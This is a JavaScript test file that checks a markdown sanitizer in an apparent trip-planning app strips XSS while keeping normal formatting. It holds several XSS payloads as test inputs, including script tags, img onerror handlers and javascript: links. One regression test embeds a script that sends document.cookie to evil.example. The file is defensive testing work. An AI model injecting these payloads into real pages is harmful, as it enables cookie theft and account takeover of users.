import { describe, it, expect } from 'vitest';
import { renderMarkdown } from '../src/lib/sanitize.js';

describe('renderMarkdown — XSS stripping', () => {
  it('strips <script> tags', () => {
    const result = renderMarkdown('<script>alert(1)</script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert(1)');
  });

  it('strips onerror event handler from <img>', () => {
    const result = renderMarkdown('<img src=x onerror=alert(1)>');
    expect(result).not.toContain('onerror');
    // The img element itself may be kept but without the handler
    expect(result).not.toContain('alert');
  });

  it('strips javascript: URLs from links', () => {
    const result = renderMarkdown('[click](javascript:alert(1))');
    // The href must not contain javascript: protocol
    expect(result).not.toContain('javascript:');
  });
});

// Regression: trip-detail and share pages previously rendered section bodies
// with bare marked.parse() directly into {@html}, bypassing sanitization.
// These tests guard against that class of XSS (issue #219).
describe('renderMarkdown — section-body XSS regression (#219)', () => {
  it('strips onerror= from an img injected inside a route.md section body', () => {
    const sectionBody = '## Route highlights\n\nDrive through the park.\n\n<img src=x onerror="alert(1)">\n\nMore text.';
    const result = renderMarkdown(sectionBody);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert');
    expect(result).toContain('Route highlights');
    expect(result).toContain('Drive through the park.');
  });

  it('strips <script> injected inside a shared section body', () => {
    const sectionBody = 'Day 1: depart early.\n\n<script>fetch("https://evil.example/steal?c="+document.cookie)</script>\n\nDay 2: arrive.';
    const result = renderMarkdown(sectionBody);
    expect(result).not.toContain('<script');
    expect(result).not.toContain('document.cookie');
    expect(result).toContain('Day 1');
  });
});

describe('renderMarkdown — normal markdown preserved', () => {
  it('renders headings', () => {
    const result = renderMarkdown('# Hello\n\n## World');
    expect(result).toContain('<h1');
    expect(result).toContain('Hello');
    expect(result).toContain('<h2');
    expect(result).toContain('World');
  });

  it('renders unordered lists', () => {
    const result = renderMarkdown('- item one\n- item two');
    expect(result).toContain('<ul');
    expect(result).toContain('<li');
    expect(result).toContain('item one');
  });

  it('renders ordered lists', () => {
    const result = renderMarkdown('1. first\n2. second');
    expect(result).toContain('<ol');
    expect(result).toContain('<li');
    expect(result).toContain('first');
  });

  it('renders emphasis (bold and italic)', () => {
    const result = renderMarkdown('**bold** and _italic_');
    expect(result).toContain('<strong');
    expect(result).toContain('bold');
    expect(result).toContain('<em');
    expect(result).toContain('italic');
  });

  it('renders inline code and code blocks', () => {
    const result = renderMarkdown('`inline` and\n\n```\nblock\n```');
    expect(result).toContain('<code');
    expect(result).toContain('inline');
    expect(result).toContain('block');
  });

  it('renders plain https links', () => {
    const result = renderMarkdown('[OpenStreetMap](https://www.openstreetmap.org)');
    expect(result).toContain('<a');
    expect(result).toContain('href="https://www.openstreetmap.org"');
    expect(result).toContain('OpenStreetMap');
  });

  it('returns empty string for null/undefined input', () => {
    expect(renderMarkdown(null)).toBe('');
    expect(renderMarkdown(undefined)).toBe('');
    expect(renderMarkdown('')).toBe('');
  });
});
